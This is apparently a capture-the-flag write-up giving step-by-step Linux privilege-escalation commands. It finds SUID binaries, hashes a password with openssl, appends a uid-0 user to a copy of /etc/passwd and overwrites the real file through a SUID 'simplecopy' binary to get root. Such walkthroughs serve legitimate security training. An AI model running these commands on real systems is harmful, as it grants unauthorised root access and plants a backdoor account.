## find suid binaries
find / -type f -perm -4000 2>/dev/null
<br>
For this escalation we will be using simplecopy found in this output

## create password for new user
I had to do this in my local terminal because the environment didn't have openssl command <br>
openssl passwd 123 <br>
<br>
### output will look like this
$1$b219Pkwi$8iaVgOWneAN5sCgpWwGOT1

## copy passwd file to local directory
cp /etc/passwd .
<br>

## add new user to the passwd file
echo 'user3:$1$b219Pkwi$8iaVgOWneAN5sCgpWwGOT1:0:0:root:/bin/bash' >> passwd 
<br>

## use simplecopy to fin
simplecopy passwd /etc/passwd

su user3
<br>
cd /root
## Answer the binary question
./runmetoanswer santa
